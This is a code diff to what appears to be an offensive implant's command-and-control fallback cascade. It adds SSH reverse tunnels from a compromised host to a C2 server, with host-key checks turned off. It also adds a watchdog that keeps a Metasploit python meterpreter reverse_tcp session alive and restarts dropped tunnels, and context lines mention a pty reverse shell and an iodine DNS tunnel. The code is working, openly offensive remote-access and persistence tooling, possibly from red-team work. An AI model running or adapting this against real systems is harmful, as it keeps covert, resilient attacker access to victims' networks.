@@ -48,6 +48,7 @@ _c2_process = None
 _c2_method = None
 _pty_child_pid = None          # Tracked so signal handler can kill it
 _meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch threads
+_ssh_tunnel_proc = None        # SSH reverse tunnel subprocess
 _watchdog_stop = threading.Event()
 _exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
@@ -61,6 +62,9 @@ def force_shutdown():
     _current_state = EgressState.FAILED
     _watchdog_stop.set()
     _exec_kill_event.set()
+
+    # Kill SSH reverse tunnels
+    _stop_ssh_tunnels()
 
     # Kill pty.spawn child (reverse shell)
     if _pty_child_pid:
@@ -131,6 +135,157 @@ def _kill_exec_thread(t):
                     "abandoned as daemon thread")
     else:
         log.info("Meterpreter exec thread terminated")
+
+
+# ── SSH Reverse Tunnels ────────────────────────────────────────
+
+def _start_ssh_tunnels(c2_host, tunnel_cfg):
+    """Start SSH reverse tunnels from beretta back to c2-server.
+
+    SSH tunnels run independently of the meterpreter transport,
+    providing reliable service access even when the single-threaded
+    meterpreter command channel is under load.
+
+    Args:
+        c2_host:    Grimlock hostname/IP (SSH destination)
+        tunnel_cfg: Dict with keys:
+            key_path:  Path to SSH private key on beretta
+            forwards:  List of dicts with local_port, remote_port, remote_host
+            ssh_port:  SSH port on the C2 server (default 22)
+            ssh_user:  SSH user on the C2 server (default "root")
+
+    Returns: subprocess.Popen handle or None on failure
+    """
+    global _ssh_tunnel_proc
+    _stop_ssh_tunnels()  # Clean up any prior tunnel
+
+    key_path = tunnel_cfg.get("key_path", "/opt/pr0t31n/LandNav/keys/tunnel_key")
+    forwards = tunnel_cfg.get("forwards", [])
+    ssh_port = tunnel_cfg.get("ssh_port", 22)
+    ssh_user = tunnel_cfg.get("ssh_user", "root")
+
+    if not forwards:
+        log.warning("SSH tunnels: no forwards configured — skipping")
+        return None
+
+    if not os.path.isfile(key_path):
+        log.error("SSH tunnels: key not found at %s — skipping", key_path)
+        return None
+
+    cmd = [
+        "ssh", "-N",
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "UserKnownHostsFile=/dev/null",
+        "-o", "ServerAliveInterval=30",
+        "-o", "ServerAliveCountMax=3",
+        "-o", "ExitOnForwardFailure=yes",
+        "-o", "BatchMode=yes",
+        "-p", str(ssh_port),
+        "-i", key_path,
+    ]
+    for fwd in forwards:
+        # -R <c2-server_port>:<beretta_target_host>:<beretta_target_port>
+        remote_host = fwd.get("remote_host", "10.10.240.61")
+        cmd += ["-R", "%d:%s:%d" % (
+            fwd["local_port"], remote_host, fwd["remote_port"])]
+    cmd.append("%s@%s" % (ssh_user, c2_host))
+
+    log.info("Starting SSH reverse tunnels: %s", " ".join(cmd))
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+        # Give SSH a moment to establish or fail
+        time.sleep(2)
+        if proc.poll() is not None:
+            _rc = proc.returncode
+            _err = ""
+            try:
+                _err = proc.stderr.read().decode(errors="replace").strip()
+            except Exception:
+                pass
+            log.error("SSH tunnel process exited immediately (rc=%d): %s",
+                      _rc, _err[:500])
+            return None
+
+        _ssh_tunnel_proc = proc
+        for fwd in forwards:
+            log.info("  SSH tunnel: c2-server:%d → %s:%d (pid=%d)",
+                     fwd["local_port"],
+                     fwd.get("remote_host", "10.10.240.61"),
+                     fwd["remote_port"], proc.pid)
+        return proc
+    except FileNotFoundError:
+        log.error("SSH tunnels: 'ssh' binary not found on target")
+        return None
+    except Exception as e:
+        log.error("SSH tunnels: failed to start: %s", e)
+        return None
+
+
+def _stop_ssh_tunnels():
+    """Terminate SSH reverse tunnel subprocess if running.
+
+    Signal-safe (no logging) — called from force_shutdown().
+    """
+    global _ssh_tunnel_proc
+    if _ssh_tunnel_proc is not None:
+        try:
+            _ssh_tunnel_proc.terminate()
+        except OSError:
+            pass
+        try:
+            _ssh_tunnel_proc.wait(timeout=3)
+        except Exception:
+            try:
+                _ssh_tunnel_proc.kill()
+            except OSError:
+                pass
+        _ssh_tunnel_proc = None
+
+
+def _check_socket_health(s):
+    """Check if the meterpreter socket is still alive.
+
+    Returns True if the socket appears healthy, False if dead.
+    Uses getpeername() + fileno() probes — non-destructive checks
+    that don't inject data into the meterpreter protocol.
+    """
+    try:
+        fd = s.fileno()
+        if fd < 0:
+            return False
+    except Exception:
+        return False
+    try:
+        s.getpeername()
+    except Exception:
+        return False
+    # Non-blocking zero-length recv to detect TCP RST / FIN
+    # without consuming data.  MSG_PEEK + MSG_DONTWAIT reads
+    # the next byte without removing it from the buffer.
+    try:
+        _old_timeout = s.gettimeout()
+        s.settimeout(0)
+        try:
+            data = s.recv(1, socket.MSG_PEEK)
+            # data=b'' means FIN received (remote closed gracefully)
+            if data == b'':
+                return False
+            # data has bytes — socket alive with pending data
+        except BlockingIOError:
+            # No data ready, but socket is still open — healthy
+            pass
+        except (ConnectionResetError, BrokenPipeError, OSError):
+            return False
+        finally:
+            s.settimeout(_old_timeout)
+    except Exception:
+        return False
+    return True
 
 
 # ── DNS Tunnel (iodine) ────────────────────────────────────────
@@ -365,7 +520,7 @@ def _prepare_stage(raw_stage):
 # ── Python Meterpreter ──────────────────────────────────────────
 
 def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
-                    proxy=None):
+                    proxy=None, **kwargs):
     """Connect to a Metasploit multi/handler with python/meterpreter_reverse_tcp.
 
     The stager protocol:
@@ -380,6 +535,7 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
         connect_timeout: Timeout per connection attempt
         retry_delay:     Delay between port attempts
         proxy:           (host, port) tuple if traffic must go through proxy
+        tunnel_cfg:      (kwarg) SSH tunnel config dict — see _start_ssh_tunnels()
 
     Returns: True if meterpreter staged, False otherwise
     """
@@ -630,16 +786,83 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             log.info("Meterpreter exec thread started (tid=%s)",
                      t.ident)
 
-            # Poll until exec finishes or force_shutdown fires
+            # ── Poll with socket watchdog + SSH tunnel startup ──
+            # The exec thread stays alive even when MSF dies because
+            # the staged meterpreter catches socket errors with bare
+            # ``except:`` and enters a reconnect loop (up to 3600s).
+            # The socket watchdog detects a dead connection and
+            # force-kills the exec thread for immediate re-cascade.
+            _sock_fail_count = 0
+            _SOCK_FAIL_THRESHOLD = 3   # consecutive failures → dead
+            _WATCHDOG_INTERVAL = 5     # seconds between health checks
+            _SSH_STABILIZE_DELAY = 10  # seconds before starting tunnels
+            _ssh_started = False
+            _tunnel_cfg = kwargs.get("tunnel_cfg")
+            _poll_tick = 0
+
             while t.is_alive():
-                t.join(timeout=1)
+                t.join(timeout=_WATCHDOG_INTERVAL)
+                _poll_tick += 1
+
                 if _exec_kill_event.is_set():
                     log.info("Shutdown signal — killing exec thread")
+                    _stop_ssh_tunnels()
                     _kill_exec_thread(t)
                     break
 
+                # ── Socket watchdog ─────────────────────────────
+                if t.is_alive() and _meterpreter_socket is not None:
+                    if _check_socket_health(_meterpreter_socket):
+                        if _sock_fail_count > 0:
+                            log.info("Socket recovered after %d "
+                                     "failed checks", _sock_fail_count)
+                        _sock_fail_count = 0
+                    else:
+                        _sock_fail_count += 1
+                        log.warning("Socket health check failed "
+                                    "(%d/%d)", _sock_fail_count,
+                                    _SOCK_FAIL_THRESHOLD)
+                        if _sock_fail_count >= _SOCK_FAIL_THRESHOLD:
+                            log.error("Socket dead — %d consecutive "
+                                      "failures.  Killing exec thread "
+                                      "for re-cascade.",
+                                      _sock_fail_count)
+                            _stop_ssh_tunnels()
+                            try:
+                                _meterpreter_socket.shutdown(
+                                    socket.SHUT_RDWR)
+                            except OSError:
+                                pass
+                            try:
+                                _meterpreter_socket.close()
+                            except OSError:
+                                pass
+                            _kill_exec_thread(t)
+                            break
+
+                # ── SSH tunnel startup after stabilization ──────
+                if (not _ssh_started and _tunnel_cfg
+                        and _poll_tick * _WATCHDOG_INTERVAL
+                        >= _SSH_STABILIZE_DELAY
+                        and t.is_alive()):
+                    _ssh_started = True
+                    log.info("Meterpreter stable for %ds — starting "
+                             "SSH reverse tunnels", _SSH_STABILIZE_DELAY)
+                    _start_ssh_tunnels(
+                        c2_host, _tunnel_cfg)
+
+                # ── Check SSH tunnel health ─────────────────────
+                if _ssh_started and _ssh_tunnel_proc is not None:
+                    if _ssh_tunnel_proc.poll() is not None:
+                        _rc = _ssh_tunnel_proc.returncode
+                        log.warning("SSH tunnel process died (rc=%d) "
+                                    "— restarting", _rc)
+                        _start_ssh_tunnels(
+                            c2_host, _tunnel_cfg)
+
             elapsed = time.monotonic() - _t0
             _meterpreter_socket = None
+            _stop_ssh_tunnels()
 
             # exec() blocked for the session lifetime.  Now it's
             # truly dead — mark FAILED for re-cascade.
@@ -817,6 +1040,7 @@ def run_cascade(config):
     c2_ports = config["c2"]["ports"]
     dns_cfg = config.get("dns_tunnel", {})
     met_cfg = config.get("meterpreter", {})
+    tunnel_cfg = config.get("ssh_tunnels")
 
     proxy = None
     # If proxy was detected and stored, use it
@@ -840,6 +1064,7 @@ def run_cascade(config):
             connect_timeout=met_cfg.get("connect_timeout", 10),
             retry_delay=met_cfg.get("retry_delay", 5),
             proxy=proxy,
+            tunnel_cfg=tunnel_cfg,
         ):
             # try_meterpreter blocks (exec) for the session lifetime.
             # On return the session is dead; _current_state is already
